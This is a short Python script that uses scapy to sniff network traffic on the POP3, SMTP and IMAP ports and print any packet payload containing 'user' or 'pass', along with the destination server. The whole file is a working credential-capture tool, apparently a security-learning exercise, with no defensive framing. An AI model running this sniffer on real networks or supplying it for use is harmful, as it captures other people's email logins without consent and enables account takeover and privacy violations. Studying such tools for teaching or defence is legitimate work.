__author__ = 'Christian Urcuqui'

from scapy.all import *


def packet_callback(packet):
    print(packet.show())

# email authentication strings captured


def email_packet_callback(packet):
    if packet[TCP].payload:
        mail_packet = str(packet[TCP].payload)
        if "user" in mail_packet.lower() or "pass" in mail_packet.lower():
            print("[*] Server: %s" % packet[IP].dst)
            print("[*] %s" % packet[TCP].payload)

# store is a parameter to save in RAM
sniff(filter="tcp port 110 or tcp port 25 or tcp port 143", prn=email_packet_callback, store=0)

